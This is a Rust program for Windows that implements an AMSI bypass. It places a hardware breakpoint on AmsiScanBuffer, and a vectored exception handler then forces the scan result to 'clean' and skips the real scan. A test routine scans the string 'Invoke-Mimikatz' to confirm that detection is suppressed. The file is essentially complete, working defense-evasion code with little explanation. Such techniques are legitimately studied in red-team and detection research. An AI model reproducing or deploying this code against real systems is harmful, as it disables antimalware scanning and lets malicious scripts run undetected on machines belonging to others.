use std::{mem::zeroed, os::raw::c_void, ptr::null_mut};

use windows_sys::Win32::{
    Foundation::{EXCEPTION_SINGLE_STEP, S_OK},
    System::{
        Antimalware::{
            AMSI_RESULT, AMSI_RESULT_CLEAN, AMSI_RESULT_DETECTED, AmsiCloseSession, AmsiInitialize,
            AmsiOpenSession, AmsiScanBuffer, AmsiUninitialize, HAMSICONTEXT, HAMSISESSION,
        },
        Diagnostics::Debug::{
            AddVectoredExceptionHandler, CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64,
            EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH, EXCEPTION_POINTERS,
            GetThreadContext, SetThreadContext,
        },
        LibraryLoader::{GetProcAddress, LoadLibraryA},
        Threading::GetCurrentThread,
    },
};

static mut AMSI_SCAN_BUFFER_ADDR: *mut c_void = null_mut();

fn set_hwbp(thread_handle: *mut c_void, addr: *mut c_void, reg_index: u32) -> bool {
    unsafe {
        let mut context = zeroed::<CONTEXT>();
        context.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;

        if GetThreadContext(thread_handle, &mut context) == 0 {
            return false;
        }

        match reg_index {
            0 => context.Dr0 = addr as u64,
            1 => context.Dr1 = addr as u64,
            2 => context.Dr2 = addr as u64,
            3 => context.Dr3 = addr as u64,
            _ => return false,
        }

        let local_enable_bit = 1u64 << (reg_index * 2);
        context.Dr7 |= local_enable_bit; // Enable the breakpoint
        context.Dr7 &= !(0x3 << (16 + reg_index * 4)); // Clear the RW bits
        context.Dr7 &= !(0x3 << (18 + reg_index * 4)); // Clear the LEN bits

        if SetThreadContext(thread_handle, &mut context) == 0 {
            return false;
        }
    }

    true
}

fn rm_hwbp(thread_handle: *mut c_void, reg_index: u32) -> bool {
    unsafe {
        let mut context = zeroed::<CONTEXT>();
        context.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;

        if GetThreadContext(thread_handle, &mut context) == 0 {
            return false;
        }

        match reg_index {
            0 => context.Dr0 = 0,
            1 => context.Dr1 = 0,
            2 => context.Dr2 = 0,
            3 => context.Dr3 = 0,
            _ => return false,
        }

        context.Dr7 &= !(1 << (reg_index * 2)); // Disable the breakpoint

        if SetThreadContext(thread_handle, &mut context) == 0 {
            return false;
        }
    }

    true
}

unsafe extern "system" fn exception_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    unsafe {
        if (*(*exception_info).ExceptionRecord).ExceptionCode == EXCEPTION_SINGLE_STEP {
            if (*(*exception_info).ExceptionRecord).ExceptionAddress == AMSI_SCAN_BUFFER_ADDR {
                println!(
                    "[+] VEH Triggered: AmsiScanBuffer: {:?}",
                    (*(*exception_info).ExceptionRecord).ExceptionAddress
                );

                /* x64 calling convention at function entry:
                [RSP+0x00] = Return address (8 bytes)
                [RSP+0x08] = Shadow space for RCX (8 bytes)
                [RSP+0x10] = Shadow space for RDX (8 bytes)
                [RSP+0x18] = Shadow space for R8  (8 bytes)
                [RSP+0x20] = Shadow space for R9  (8 bytes)
                [RSP+0x28] = 5th parameter: amsiSession (8 bytes)
                [RSP+0x30] = 6th parameter: AMSI_RESULT* (8 bytes) */

                let amsi_result =
                    *((*(*exception_info).ContextRecord).Rsp as *const *mut AMSI_RESULT).offset(6);

                if !amsi_result.is_null() {
                    *amsi_result = AMSI_RESULT_CLEAN;
                    // *amsi_result = AMSI_RESULT_DETECTED;
                }

                (*(*exception_info).ContextRecord).Rip =
                    *((*(*exception_info).ContextRecord).Rsp as *const u64);
                (*(*exception_info).ContextRecord).Rsp += std::mem::size_of::<*mut c_void>() as u64;
                (*(*exception_info).ContextRecord).Rax = S_OK as u64;

                (*(*exception_info).ContextRecord).EFlags |= 0x10000;

                return EXCEPTION_CONTINUE_EXECUTION;
            }
            return EXCEPTION_CONTINUE_SEARCH;
        }
        return EXCEPTION_CONTINUE_SEARCH;
    }
}

fn check_amsi() -> bool {
    unsafe {
        let app_name: Vec<u16> = "AMSI Test\0".encode_utf16().collect();
        let mut ctx: HAMSICONTEXT = null_mut();

        if AmsiInitialize(app_name.as_ptr(), &mut ctx) != S_OK {
            println!("[-] Failed to initialize AMSI");
            return false;
        }
        println!("[+] AMSI Initialized");

        let mut session: HAMSISESSION = null_mut();
        if AmsiOpenSession(ctx, &mut session) != S_OK {
            println!("[-] Failed to open AMSI session");
            return false;
        }
        println!("[+] AMSI Session Opened");

        let string: Vec<u16> = "Invoke-Mimikatz\n".encode_utf16().collect();

        let content_name: Vec<u16> = "PowerShell\0".encode_utf16().collect();
        let mut result: AMSI_RESULT = 0;

        let length_in_bytes = (string.len() * 2) as u32;

        let hr = AmsiScanBuffer(
            ctx,
            string.as_ptr() as *const c_void,
            length_in_bytes,
            content_name.as_ptr(),
            session,
            &mut result,
        );

        if hr != S_OK {
            println!("[-] AmsiScanBuffer failed: 0x{:X}", hr);
            return false;
        }

        println!("[+] AmsiScanBuffer result: {:?}", result);

        let detected = result >= AMSI_RESULT_DETECTED;
        if detected {
            println!("[+] AmsiScanBuffer detected malicious content");
        } else {
            println!("[+] AMSI did NOT flag the string");
        }

        AmsiCloseSession(ctx, session);
        AmsiUninitialize(ctx);
        detected
    }
}

fn main() {
    unsafe {
        let h_amsi = LoadLibraryA("amsi.dll\0".as_ptr() as *const u8);

        if h_amsi.is_null() {
            println!("[-] Failed to get handle to amsi.dll");
            return;
        }
        println!("[+] Found amsi.dll at: {:?}", h_amsi);

        let amsi_scan_buffer = GetProcAddress(h_amsi, "AmsiScanBuffer\0".as_ptr() as *const u8)
            .unwrap() as *mut c_void;

        if amsi_scan_buffer.is_null() {
            println!("[-] Failed to get address of AmsiScanBuffer");
            return;
        }

        AMSI_SCAN_BUFFER_ADDR = amsi_scan_buffer;
        println!("[+] Found AmsiScanBuffer at: {:?}", amsi_scan_buffer);

        AddVectoredExceptionHandler(1, Some(exception_handler));
        set_hwbp(GetCurrentThread(), amsi_scan_buffer, 0);

        check_amsi();

        rm_hwbp(GetCurrentThread(), 0);
    }
}
